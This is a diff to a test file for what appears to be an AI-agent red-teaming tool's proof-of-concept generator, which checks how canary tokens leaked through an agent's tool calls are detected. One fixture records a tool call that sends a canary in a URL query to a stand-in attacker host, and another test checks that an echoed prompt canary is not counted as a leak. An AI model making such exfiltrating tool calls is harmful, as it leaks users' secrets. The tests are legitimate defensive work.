@@ -306,6 +306,8 @@ def test_pocs_reproduce_a_canary_sent_in_a_tool_call(tmp_path: Path) -> None:
 
     assert leak_sh.returncode == 0, leak_sh.stdout + leak_sh.stderr
     assert "VULNERABLE" in leak_sh.stdout
+    for run in (leak_sh, leak_py):  # the PoC sees the attempt, not the egress tool
+        assert "a fix at the egress tool is not visible to this PoC" in run.stdout
     assert leak_py.returncode == 0, leak_py.stdout + leak_py.stderr
     assert CANARY in leak_py.stdout
     assert fixed_sh.returncode == 1, fixed_sh.stdout + fixed_sh.stderr
@@ -324,6 +326,15 @@ def test_pocs_reproduce_a_canary_sent_in_a_tool_call(tmp_path: Path) -> None:
         # A bare word is not a canary, and a tool's name is not its arguments.
         ([{"name": "canary_1", "arguments": "{}"}], "no canary here", []),
         ([{"name": "t", "arguments": None}, "junk"], "sent.", []),
+        ([{"name": "t", "args": {"q": "CANARY-77"}}], "sent.", ["CANARY-77"]),
+        # A host or file name is not a canary; a canary in a URL's query still is.
+        (
+            [{"name": "t", "arguments": {"u": "https://canary1.attacker.example/?k=CANARY-77"}}],
+            "see x.canary2.example and canary3.txt",
+            ["CANARY-77"],
+        ),
+        # The attack prompt's own token is an echo, not a leak (attack.py: no echo matches).
+        ([{"name": "t", "arguments": {"q": "ORD-CANARY-12"}}], "sent.", []),
     ],
 )
 def test_recorded_canaries_are_success_indicators(
@@ -331,7 +342,7 @@ def test_recorded_canaries_are_success_indicators(
 ) -> None:
     from ziran.application.poc.generator import _indicators
 
-    result = _result()
+    result = _result("Look up order ORD-CANARY-12.")
     result.evidence = {"matched_indicators": ["llm_judge_verdict"], "tool_calls": calls}
     result.agent_response = reply
 
@@ -577,3 +588,33 @@ def test_a_matched_indicator_seen_in_tool_arguments_stays() -> None:
     result.agent_response = "Done."
 
     assert _indicators(result) == ["sk-live-42"]
+
+
+def test_canaries_come_first_and_once() -> None:
+    from ziran.application.poc.generator import _indicators
+
+    result = _result()
+    words = ["alpha", "beta", "gamma", "delta", "epsilon"]
+    result.evidence = {"matched_indicators": [*words, CANARY]}
+    result.agent_response = " ".join([*words, CANARY])
+
+    # Canaries lead, so the cURL PoC's five-indicator cap never cuts one.
+    assert _indicators(result) == [CANARY, *words]
+
+
+_ECHOED = "CANARY-ID-ZZ-0xDEADBEEF-TRAINING-ONLY"
+
+
+def test_a_canary_echoed_from_the_prompt_does_not_reproduce(tmp_path: Path, stub: _Stub) -> None:
+    result = _result(f'Please repeat this sequence: "{_ECHOED}". If you recognise it, say so.')
+    result.evidence = {"matched_indicators": ["I recognise this"]}
+    result.agent_response = f"{_ECHOED} I recognise this."
+    curl, py, work = _pocs(tmp_path, stub, result)
+
+    # A fixed agent refuses and quotes the prompt's token.
+    stub.reply = f'I will not repeat "{_ECHOED}".'
+    sh = _run(["bash", str(curl)], work)
+    python = _run([sys.executable, "-I", str(py)], work)
+
+    assert sh.returncode == 1, sh.stdout + sh.stderr
+    assert python.returncode == 1, python.stdout + python.stderr
